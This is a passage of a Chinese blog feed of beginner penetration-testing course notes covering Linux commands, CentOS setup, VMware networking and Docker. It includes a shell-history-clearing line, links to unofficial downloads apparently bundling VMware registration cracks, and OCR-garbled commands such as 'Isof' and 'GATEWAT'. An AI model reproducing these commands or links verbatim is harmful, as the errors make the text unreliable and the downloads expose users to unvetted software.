      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-2-4.2-linux-chang-yong-cao-zuo/</url>
      
        <content type="html"><![CDATA[<p><a name="PHHuF"></a></p><h2 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h2><p>man command (manual)——具体参数和使用方法<br>whatis command——命令的简要说明<br>info command——详细介绍<br>help command——Linux内置 命令</p><p><a name="Q0jFu"></a></p><h2 id="关机重启-root用户"><a href="#关机重启-root用户" class="headerlink" title="关机重启(root用户)"></a>关机重启(root用户)</h2><p>关机&amp;#x20;<br><code>poweroff</code><br><code>shutdown -h now</code><br><code>halt -p</code><br>重启:<br><code>reboot</code> <a name="UGT3s"></a></p><h2 id="快捷键和命令-1"><a href="#快捷键和命令-1" class="headerlink" title="快捷键和命令-1"></a>快捷键和命令-1</h2><table><thead><tr><th>操作</th><th>作用</th></tr></thead><tbody><tr><td>Tab键</td><td>补全命令和目录(自动提示)</td></tr><tr><td>方向键</td><td>上一条命令:↑;下一条命令↓</td></tr><tr><td>Ctrl + r</td><td>搜索历史命令，回车执行</td></tr><tr><td>!cd:</td><td>重复执行最近一次，以cd开头的历史命令</td></tr><tr><td>Ctrl + Insert</td><td>复制</td></tr><tr><td>Shift + Insert</td><td>粘贴</td></tr><tr><td>Alt + Insert</td><td>复制并粘贴</td></tr></tbody></table><p><a name="lPHDQ"></a></p><h2 id="快捷键和命令-2"><a href="#快捷键和命令-2" class="headerlink" title="快捷键和命令-2"></a>快捷键和命令-2</h2><table><thead><tr><th>操作</th><th>作用</th></tr></thead><tbody><tr><td>Ctrl+E</td><td>光标移动到行位</td></tr><tr><td>Ctrl+A</td><td>光标移动到行首</td></tr><tr><td>Ctrl+K</td><td>清除光标后至行尾的内容</td></tr><tr><td>Ctrl+U</td><td>清除光标前至行首间的所有内容</td></tr><tr><td><code>clear</code></td><td>清屏，但是命令都还在</td></tr><tr><td><code>history</code></td><td>查看历史命令</td></tr><tr><td><code>history -C</code></td><td>清除历史命令kali: echo &gt; ~/.zsh_ history</td></tr></tbody></table><p><a name="s2GuG"></a></p><h2 id="别名配置alias"><a href="#别名配置alias" class="headerlink" title="别名配置alias"></a>别名配置alias</h2><p>查看别名: alias<br>设置别名(以bash为例) : vim ~/.bashrc<br>格式: alias short= ‘xx;xxx’<br>生效: source ~/.bashrc</p><p><a name="CbeNC"></a></p><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table><thead><tr><th>符号</th><th>指代</th></tr></thead><tbody><tr><td>*</td><td>任意字符</td></tr><tr><td>?</td><td>单个字符</td></tr><tr><td>[]</td><td>括号里面可选一个， 比如[0-9][a-z]</td></tr><tr><td>{}</td><td>多个 ll {.log,*.txt}</td></tr><tr><td>^</td><td>取反</td></tr></tbody></table><p><a name="WyAoe"></a></p><h2 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h2><p>环境变量的作用?<br>查看全部变量: env<br>查看单个变量: echo $XXX<br>用户变量: ~/.bashrc<br>系统变量: /etc/profile</p><p><a name="zKT8X"></a></p><h3 id="案例-设置JDK环境变量"><a href="#案例-设置JDK环境变量" class="headerlink" title="案例:设置JDK环境变量"></a>案例:设置JDK环境变量</h3><p>vim /etc/profile</p><p><code>export JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74</code><br><code>export PATH=$JAVA_HOME/bin:$PATH</code><br><code>export CLASSPATH=.:$JAVA_ HOME/ib/dt.jar:$JAVA_HOME/ib/tools.jar</code></p><p>source /etc/ profile</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-4.1-Linux系统结构</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-1-4.1-linux-xi-tong-jie-gou/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-4-linux-cao-zuo-xi-tong-ji-chu-zhi-shi/ke-shi-1-4.1-linux-xi-tong-jie-gou/</url>
      
        <content type="html"><![CDATA[<p><a name="eWhzn"></a></p><h1 id="Linux系统结构"><a href="#Linux系统结构" class="headerlink" title="Linux系统结构"></a>Linux系统结构</h1><ol><li>内核</li><li>Shell</li><li>文件系统</li><li>应用程序</li></ol><p><a name="Spyfi"></a></p><h2 id="Linux操作系统内核"><a href="#Linux操作系统内核" class="headerlink" title="Linux操作系统内核"></a>Linux操作系统内核</h2><ol><li>管理进程</li><li>管理内存</li><li>管理驱动</li><li>管理文件和网络</li></ol><p><a name="GwWxj"></a></p><h2 id="Linux-Shell"><a href="#Linux-Shell" class="headerlink" title="Linux Shell"></a>Linux Shell</h2><p>w.vipc9.com<br>接收用户的命令，经过转换，交给内核去执行<br>cat -&gt; open() read()<br>1、简化操作<br>2、安全 <a name="l6gbD"></a></p><h3 id="Linux-Shell工具"><a href="#Linux-Shell工具" class="headerlink" title="Linux Shell工具"></a>Linux Shell工具</h3><table><thead><tr><th>名称</th><th>程序路径</th><th>作者</th></tr></thead><tbody><tr><td>bourne Shell</td><td>/usr/bin/sh或/bin/sh</td><td>Stephen Bourne</td></tr><tr><td>C Shell</td><td>/usr/bin/csh</td><td>Bill Joy</td></tr><tr><td>K Shell</td><td>/usr/bin/ksh</td><td>David Korn</td></tr><tr><td>Bourne Again Shell</td><td>/bin/bash</td><td>Brian Fox</td></tr><tr><td>Z Shell</td><td>/bin/zsh或/usr/bin/zsh</td><td>Paul Falstad</td></tr></tbody></table><p>Windows: cmd、Power Shell</p><pre class="line-numbers language-none"><code class="language-none">[root@xuegod63 ~]# echo $SHELL/bin/bash[root@xuegod63 ~]# cat /etc/shells/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin/bin/tcsh/bin/csh[root@xuegod63 ~]# chsh -l/bin/sh/bin/bash/sbin/nologin/usr/bin/sh/usr/bin/bash/usr/sbin/nologin/bin/tcsh/bin/csh切换当用户shell：[root@xuegod63 ~]# chsh -s /bin/csh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="tXuWe"></a></p><h3 id="Shell和Terminal"><a href="#Shell和Terminal" class="headerlink" title="Shell和Terminal"></a>Shell和Terminal</h3><table><thead><tr><th>敲字</th><th>看</th><th></th></tr></thead><tbody><tr><td>bash</td><td></td><td></td></tr><tr><td>解析和翻译用户输入</td><td>terminal</td><td></td></tr><tr><td>接受输入，并绘制输出</td><td>壳Shell</td><td></td></tr><tr><td>系统调用</td><td>stdout/stderr</td><td></td></tr><tr><td>操作系统</td><td></td><td>核Kernel</td></tr></tbody></table><p><a name="Wdcbv"></a></p><h3 id="Shell编程-x2F-Shell脚本-sh"><a href="#Shell编程-x2F-Shell脚本-sh" class="headerlink" title="Shell编程/Shell脚本(.sh)"></a>Shell编程/Shell脚本(.sh)</h3><p><a name="nJ74C"></a></p><h2 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h2><p>“一切皆文件”<br>普通文件、目录、进程(/proc) 、输入输出设备(/dev) 、网络字节流socket、 链接文件w.管道文件</p><table><thead><tr><th>查看文件</th><th>作用</th></tr></thead><tbody><tr><td>lsof /bin/bash</td><td>查找某个文件相关的进程</td></tr><tr><td>Isof -u root</td><td>列出某个用户打开的文件信息</td></tr><tr><td>Isof -C redis</td><td>列出某个程序进程所打开的文件信息</td></tr><tr><td>Isof -i tcp</td><td>列出所有tcp网络连接信息</td></tr></tbody></table><p><a name="wxcvg"></a></p><h2 id="Linux目录"><a href="#Linux目录" class="headerlink" title="Linux目录"></a>Linux目录</h2><p>蓝色表示目录;<br>绿色表示可执行文件;<br>红色表示压缩文件;<br>浅蓝色表示链接文件;<br>白色表示其他文件:<br>xxx是设备文件，包括block, char, ffo.</p><p><a name="AtizJ"></a></p><h3 id="根目录文件-1"><a href="#根目录文件-1" class="headerlink" title="根目录文件-1"></a>根目录文件-1</h3><table><thead><tr><th>目录</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>bin</td><td>存放普通用户可执行的指令</td><td>即使在单用户模式下也能够执行处理</td></tr><tr><td>boot</td><td>开机引导目录</td><td>包括Linux内核文件与开机所需要的文件</td></tr><tr><td>dev</td><td>设备目录</td><td>所有的硬件设备及周边均放置在这个设备目录中，比如声卡、磁盘</td></tr><tr><td>etc</td><td>各种配置文件目录</td><td>大部分配置属性均存放在这里</td></tr><tr><td>lib</td><td>库文件存放地，bin和sbin需要的库文件</td><td>类似windows的DLL</td></tr><tr><td>media</td><td>可移除设备挂载目录</td><td>类似U盘、光盘、移动硬盘等临时挂放目录</td></tr></tbody></table><p><a name="gPh9x"></a></p><h3 id="根目录文件-2"><a href="#根目录文件-2" class="headerlink" title="根目录文件-2"></a>根目录文件-2</h3><table><thead><tr><th>目录</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>mnt</td><td>用房临时挂载其他的文件系统</td><td>额外的设备可挂载在这里,相对临时而言</td></tr><tr><td>opt</td><td>第三方软件安装目录</td><td>现在习惯性的放置在/usr/local中</td></tr><tr><td>proc</td><td>虚拟文件系统</td><td>通常是内存中的映射，特别注意在误删除数据文件后，比如DB,只要系统不重启，还是有很大几率能将数据找回来</td></tr><tr><td>root</td><td>系统管理员主目录</td><td>除root之外,其他用户均放置在/home目录下</td></tr><tr><td>run</td><td>系统运行时所需文件</td><td>以前防止在/ar/run中,后来拆分成独立的/run目录。</td></tr><tr><td>重启后重新生成对应的目录数据</td><td></td><td></td></tr></tbody></table><p><a name="vHPE8"></a></p><h3 id="根目录文件-3"><a href="#根目录文件-3" class="headerlink" title="根目录文件-3"></a>根目录文件-3</h3><table><thead><tr><th>目录</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>sbin</td><td>只有5eot才能运行的管理指令</td><td>跟bin类似,但只属于root管理员</td></tr><tr><td>srv</td><td>服务启动后需要访问的数据目录</td><td>&amp;#x20;</td></tr><tr><td>&amp;#x20;</td><td></td><td></td></tr><tr><td>sys</td><td>跟proc-样，虚拟文件系统</td><td>记录核心系统硬件信息</td></tr><tr><td>tmp</td><td>存放临时文件目录</td><td>所有用户对该目录均可读写</td></tr><tr><td>usr</td><td>应用程序放置目录</td><td></td></tr><tr><td>var</td><td>存放系统执行过程经常改变的文件</td><td></td></tr></tbody></table><p><a name="AIrA3"></a></p><h3 id="用户主目录"><a href="#用户主目录" class="headerlink" title="用户主目录"></a>用户主目录</h3><p>主目录: home directory<br>root用户的主目录是/root<br>其他用户的主目录是/home/用户名<br>cd空格或者cd ~<br>工作目录: working directory</p><p><a name="TRfgn"></a></p><h3 id="目录指代"><a href="#目录指代" class="headerlink" title="目录指代"></a>目录指代</h3><table><thead><tr><th>符号</th><th>指代</th></tr></thead><tbody><tr><td>绝对路径</td><td>由根目录/开始写起</td></tr><tr><td>相对路径</td><td>从当前所在的工作目录开始写起</td></tr><tr><td><code>/</code></td><td>根目录</td></tr><tr><td><code>.</code></td><td>代表当前目录</td></tr><tr><td><code>~</code></td><td>代表用户工作目录，vim ~/.bashrc</td></tr><tr><td><code>../</code></td><td>代表上一-级目录</td></tr><tr><td><code>../../</code></td><td>上上一级目录，以此类推，超出范围的时候代表根目录</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时9-3.5.5-Xshell连接CentOS</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-9-3.5.5-xshell-lian-jie-centos/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-9-3.5.5-xshell-lian-jie-centos/</url>
      
        <content type="html"><![CDATA[<p><a name="FiC8A"></a></p><h1 id="Xshell远程连接"><a href="#Xshell远程连接" class="headerlink" title="Xshell远程连接"></a>Xshell远程连接</h1><p>Xshell .<br>FinalShell (国产免费)<br>MobaXterm<br>SecureCRT</p><p>添加连接<br>修改编码解决中文乱码<br>窗口排列 <a name="UlqY3"></a></p><h1 id="xshell全家桶"><a href="#xshell全家桶" class="headerlink" title="xshell全家桶."></a>xshell全家桶.</h1><p>链接: <a href="https://pan.baidu.com/s/16nkDC5_w02uOF3RYuBQH1Q?pwd=8888">https://pan.baidu.com/s/16nkDC5_w02uOF3RYuBQH1Q?pwd=8888</a><br>提取码: 8888<br>备注:如果报错缺少dll ( VC+ +环境的问题,有360的情况下会自动安装),就去官网下一个<br>最新版,或者改用FinalShell或者MobaXterm<br>家庭免费版: <a href="https://www.xshell.com/zh/free-for-home-school/">https://www.xshell.com/zh/free-for-home-school/</a></p><p><a name="qJ6Ou"></a></p><h1 id="jdk-11-0-11-windows-x64-bin-zip"><a href="#jdk-11-0-11-windows-x64-bin-zip" class="headerlink" title="jdk- 11.0.11_windows-x64_bin.zip"></a>jdk- 11.0.11_windows-x64_bin.zip</h1><p>链接:<a href="https://pan.baidu.com/s/1h_e_rKkj6bKug5fKwtn6Pg?pwd=8888">https://pan.baidu.com/s/1h_e_rKkj6bKug5fKwtn6Pg?pwd=8888</a><br>提取码: 8888</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时8-3.5.4-CentOS修改yum源</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-8-3.5.4-centos-xiu-gai-yum-yuan/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-8-3.5.4-centos-xiu-gai-yum-yuan/</url>
      
        <content type="html"><![CDATA[<blockquote><p>yum是CentOS中的–种软件管理器,通过yum安装软件，可以自动解决包依赖的问题，免去手工安装依赖包的麻烦。<br>yum使用了一个中心仓库来记录和管理软件的依赖关系,默认为mirrorlist.centos.org,叫做CentOS官方yum源。<br>这个仓库可以类比为手机的应用市场，应用市场也有很多,比如华为应用市场、小米应用市场、应用宝等等。</p></blockquote><p>yum源路径：/etc/yum.repos.d/CentOS-Base.repo</p><p>备份命令:</p><pre><code>cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak</code></pre><p>下载阿里云源配置，覆盖原文件<br>命令:</p><pre><code>curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</code></pre><p>3、清理缓存并生成新的缓存<br>命令:</p><pre><code>yum clean allyum makecache</code></pre><p>如果出现”Failed connect to mirrors.aliyuncs.com:80;<br>Connection refused”的错误，重试即可。</p><p>4、更新软件<br>注意:这一步会更新操作系统中所有软件到最新版，不是必<br>要操作。而且网速慢的情况下，会非常耗时，谨慎操作。<br>命令:</p><pre><code>sudo yum -y update</code></pre><p>如果要中断，就按CtrI+C。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时7-3.5.3-CentOS配置静态IP</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-7-3.5.3-centos-pei-zhi-jing-tai-ip/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-7-3.5.3-centos-pei-zhi-jing-tai-ip/</url>
      
        <content type="html"><![CDATA[<p>Centos设置静态IP</p><ul><li>查看物理机IP</li></ul><p>打开cmd,输入ipconfig -all<br>如果你的电脑用的是有线网络，就找到“以太网”的IPv4地址:</p><ul><li>输入命令(复制以后在终端里面Shift+Insert粘贴) :</li></ul><!----><pre><code>vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p>按回车打开配置文件。</p><pre><code>BOOTPROTO=staticIPADDR=192.168.70.134NETMASK =255.255.255.0DNS1=114.114.114.114GATEWAT=192.168.70.2</code></pre><ul><li>重启网络服务：</li></ul><!----><pre><code>service network restart</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时6-3.5.2-VI编辑器</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-6-3.5.2-vi-bian-ji-qi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-6-3.5.2-vi-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<p><a name="yX81X"></a></p><h1 id="VI编辑器"><a href="#VI编辑器" class="headerlink" title="VI编辑器"></a>VI编辑器</h1><p>1、命令模式:只能输入命令<br>2、编辑模式(也叫插入模式) :可以修改文本<br><code>i</code><br>3、底行模式:结束操作<br><code>:wq</code></p><p>可能会出现的问题:</p><ol><li>只读权限</li><li>临时swp文件 <a name="JnvqK"></a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时5-3.5.1-安装CentOS</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-5-3.5.1-an-zhuang-centos/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-5-3.5.1-an-zhuang-centos/</url>
      
        <content type="html"><![CDATA[<p><a name="gHAkU"></a></p><h3 id="参考教程"><a href="#参考教程" class="headerlink" title="参考教程"></a>参考教程</h3><p>教程合集<br>01-安装CentOS.pdf<br>02-CentOS静态IP配置pdf<br>03-解压版CentOS使用方法.pdf (推荐)<br>04-CentOS替换yum源为阿里云.pdf</p><p><a name="mYeAl"></a></p><h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><p>1、镜像来源<br>2、版本: CentOS 7<br>3、root密码设置<br>4、语言选择<br>5、桌面系统</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时4-3.4-VMware三种网络模式</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-4-3.4-vmware-san-chong-wang-luo-mo-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-4-3.4-vmware-san-chong-wang-luo-mo-shi/</url>
      
        <content type="html"><![CDATA[<p><a name="XvdD8"></a></p><h1 id="VMware三种网络模式"><a href="#VMware三种网络模式" class="headerlink" title="VMware三种网络模式"></a>VMware三种网络模式</h1><ul><li>桥接模式(Bridge)</li><li>NAT模式(NAT: Network Address Translation),</li><li>仅主机模式(Host-Only) <a name="XyVSn"></a></li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>网卡<br>路由器<br>交换机</p><p><a name="Jxk2P"></a></p><h1 id="虚拟交换机"><a href="#虚拟交换机" class="headerlink" title="虚拟交换机"></a>虚拟交换机</h1><p>虚拟交换机                 用途<br>VMnet0                 桥接模式<br>VMnet1                 仅主机模式<br>VMnet8                 NAT模式<br>虚拟机交换机的作用:让相同模式的虚拟机相互连接</p><p><a name="Q7euS"></a></p><h1 id="虚拟网卡"><a href="#虚拟网卡" class="headerlink" title="虚拟网卡"></a>虚拟网卡</h1><p>虚拟网卡                                                     用途<br>VMware Network Adapter VMnet1          仅主机模式<br>VMware Network Adapter VMnet8          NAT模式<br>虚拟机网卡的作用:让主机和虚拟机相互连接 <a name="jVTBZ"></a></p><h1 id="关键问题"><a href="#关键问题" class="headerlink" title="关键问题"></a>关键问题</h1><p>1、主机怎么和虚拟机连接?<br>2、虚拟机怎么连接到互联网?</p><p><a name="Bnrvo"></a></p><h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式 Bridge 使用主机的网卡</p><p><a name="FMbCX"></a></p><h3 id="桥接-总结2"><a href="#桥接-总结2" class="headerlink" title="桥接-总结2"></a>桥接-总结2</h3><p>连通情况<br>1、主机和虚拟机可以访问.<br>2、虚拟机之间可以相互访问<br>3、可以访问互联网<br>4、可以访问其他主机<br>5、其他主机可以访问本虚拟机<br>使用场景<br>创建一个虚拟服务器在内网提供网络服务 <a name="xcqzX"></a></p><h2 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h2><p>虚拟路由器(NAT设备)<br>vmnet8虚拟交换机 <a name="GmaBS"></a></p><h3 id="NAT-总结1"><a href="#NAT-总结1" class="headerlink" title="NAT-总结1"></a>NAT-总结1</h3><p>通信方式<br>1、虚拟NAT设备(虚拟路由)连接到VMnet8虚拟交换机虚拟机联网用<br>2、主机通过VMware Network Adapter VMnet8虚拟网卡连接到VMnet8虛拟交换机一主机和虚拟机连接用<br>特点<br>1、虚拟机在外部网络中没有自己的IP地址<br>2、虚拟NAT设备会把专用网络中的IP地址转换为主机系统的IP地址一网络地址转换<br>3、主机可以联网，虚拟机就可以联网<br>配置<br>无</p><p><a name="DukC3"></a></p><h2 id="NAT-总结2"><a href="#NAT-总结2" class="headerlink" title="NAT-总结2"></a>NAT-总结2</h2><p>连通情况<br>1、主机和虚拟机可以访问<br>2、虚拟机之间可以相互访问<br>3、可以访问互联网<br>4、本机虚拟机可以访问其他主机<br>5、其他主机不能访问本机虚拟机。解决办法:共享网络、端口映射<br>使用场景<br>大部分情况 <a name="z4lIp"></a></p><h2 id="仅主机模式"><a href="#仅主机模式" class="headerlink" title="仅主机模式"></a>仅主机模式</h2><p>仅主机模式Host Only<br>vmnet1虚拟交换机 <a name="Kqbyg"></a></p><h3 id="仅主机-总结1"><a href="#仅主机-总结1" class="headerlink" title="仅主机-总结1"></a>仅主机-总结1</h3><p>通信方式<br>主机使用VMware Network Adapter VMnet1虚拟网卡连接到VMnet1虚拟交换机<br>特点<br>没有了NAT设备(虚拟路由)，所以不能上网<br>配置<br>无 <a name="z9yAm"></a></p><h3 id="仅主机-总结2"><a href="#仅主机-总结2" class="headerlink" title="仅主机-总结2"></a>仅主机-总结2</h3><p>连通情况<br>1、主机和虚拟机可以访问<br>2、虚拟机之间可以相互访问<br>3、不能访问互联网<br>4、不能访问其他主机<br>5、其他主机不能访问本机虚拟机<br>使用场景<br>创建一个与其他机器隔离的网络</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-3.3-安装VMware</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-3-3.3-an-zhuang-vmware/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-3-3.3-an-zhuang-vmware/</url>
      
        <content type="html"><![CDATA[<p><a name="ofPig"></a></p><h2 id="一、操作系统和虚拟机类"><a href="#一、操作系统和虚拟机类" class="headerlink" title="一、操作系统和虚拟机类"></a>一、操作系统和虚拟机类</h2><p>注意:不要直接点击链接,复制到浏览器打开<br>vmare15 pro<br>链接: <a href="https://pan.baidu.com/s/10mYUt5Zn1FqBeqW-7B0-Dg?pwd=8888">https://pan.baidu.com/s/10mYUt5Zn1FqBeqW-7B0-Dg?pwd=8888</a><br>提取码: 8888</p><p>vmware16+注册.zip<br>链接: <a href="https://pan.baidu.com/s/1UpcnqiRv6nUuzO0EOZ22zq?pwd=8888">https://pan.baidu.com/s/1UpcnqiRv6nUuzO0EOZ22zq?pwd=8888</a><br>提取码: 8888<br>备注:如果闪退,可能是和操作系统兼容的问题。可以找一个其他版本</p><p>kali-linux- 2022.1-vmware-amd64 (解压版,推荐)<br>链接:<a href="https://pan.baidu.com/s/1YwrnoGT4DHKpM0ii7v3qag?pwd=8888">https://pan.baidu.com/s/1YwrnoGT4DHKpM0ii7v3qag?pwd=8888</a><br>备注:解压,用VMWare打开就可以使用,用户名和密码都是kali</p><p>CentOS7镜像(解压版)(推荐)<br>链接: <a href="https://pan.baidu.com/s/1-TedxVkWflKgaOepxve4CQ?pwd=8888">https://pan.baidu.com/s/1-TedxVkWflKgaOepxve4CQ?pwd=8888</a><br>提取码: 8888</p><p>CentOS7解压版使用说明<br>链接: <a href="https://pan.baidu.com/s/17iAsPsf5PMmOzyBvrQwCGA">https://pan.baidu.com/s/17iAsPsf5PMmOzyBvrQwCGA</a><a href="https://pan.baidu.com/s/1-TedxVkWflKgaOepxve4CQ?pwd=8888">?pwd=8888</a></p><p>kali官网下载地址:<a href="https://www.kali.org/get-kali/#kali-installer-images">https://www.kali.org/get-kali/#kali-installer-images</a><br>靶场：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a> <a name="iBjZl"></a></p><h1 id="物理机蓝屏的问题"><a href="#物理机蓝屏的问题" class="headerlink" title="物理机蓝屏的问题"></a>物理机蓝屏的问题</h1><p>虚拟机开机导致物理机蓝屏或重启的问题<br>安装最新版Vmware大概率可以解决<br><a href="https://blog.csdn.net/weixin_55118477/article/details/121080830">https://blog.csdn.net/weixin_55118477/article/details/121080830</a><br><a href="https://blog.csdn.net/wwwwzz/article/details/114682821">https://blog.csdn.net/wwwwzz/article/details/114682821</a> <a name="f9AFd"></a></p><h1 id="VMware基本功能"><a href="#VMware基本功能" class="headerlink" title="VMware基本功能"></a>VMware基本功能</h1><p>打开现有虚拟机<br>编辑网络一 ‘虚拟网络编辑器”<br>虚拟机被锁定<br>克隆和快照<br>与物理机传输文件</p><p><a name="yUKRH"></a></p><h3 id="虚拟机被锁定"><a href="#虚拟机被锁定" class="headerlink" title="虚拟机被锁定"></a>虚拟机被锁定</h3><p>1、原因:启动了多个VMWare程序，在多个窗口打开了一个虚拟机.<br>2、解决办法:找到原来的窗口，或者删除虚拟机目录下所有的.Ick文件和.Ick目录</p><p><a name="mDZoF"></a></p><h3 id="重启或者合上屏幕以后虚拟机连不上"><a href="#重启或者合上屏幕以后虚拟机连不上" class="headerlink" title="重启或者合上屏幕以后虚拟机连不上"></a>重启或者合上屏幕以后虚拟机连不上</h3><p>1、在网络适配器中，禁用VMnet8,再启用就OK了<br>2、可以做成脚本，右键管理员运行</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-3.2-Docker容器技术</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-2-3.2-docker-rong-qi-ji-zhu/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-2-3.2-docker-rong-qi-ji-zhu/</url>
      
        <content type="html"><![CDATA[<p><a name="HHzJP"></a></p><h1 id="Docker架构图"><a href="#Docker架构图" class="headerlink" title="Docker架构图"></a>Docker架构图</h1><p><img src="../../../../assets/bpgfs077azvyfcac_cmy92c/1668227952375-03f16ead-42d8-477c-8657-380da0432700.png" alt="image.png"><br>例如：<a href="https://vulhub.org/">https://vulhub.org/</a> <a name="IBV8o"></a></p><h1 id="Docker特点"><a href="#Docker特点" class="headerlink" title="Docker特点"></a>Docker特点</h1><ul><li>开箱即用</li><li>快速部署</li><li>可移植性强</li><li>环境隔离 <a name="cHoSB"></a></li></ul><h1 id="Docker实现原理"><a href="#Docker实现原理" class="headerlink" title="Docker实现原理"></a>Docker实现原理</h1><ul><li>namespace——系统环境的隔离</li><li>Cgroup——资源限制</li><li>镜像管理文件系统操作——根目录环境的隔离</li></ul><p><a name="AHVUY"></a></p><h1 id="虚拟机和Docker"><a href="#虚拟机和Docker" class="headerlink" title="虚拟机和Docker"></a>虚拟机和Docker</h1><p><img src="../../../../assets/bpgfs077azvyfcac_cmy92c/1668228835598-dcdde231-cd84-4fb0-a2c1-135e13fb3533.png" alt="image.png"> <a name="xWKEK"></a></p><h1 id="虚拟机和Docker特点对比"><a href="#虚拟机和Docker特点对比" class="headerlink" title="虚拟机和Docker特点对比"></a>虚拟机和Docker特点对比</h1><p><img src="../../../../assets/bpgfs077azvyfcac_cmy92c/1668228897233-90d5e3ea-6cdd-46e6-b73f-5bebba2f54e1.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-3.1-什么是虚拟机</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-1-3.1-shi-me-shi-xu-ni-ji/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-3-an-zhuang-he-pei-zhi-centos/ke-shi-1-3.1-shi-me-shi-xu-ni-ji/</url>
      
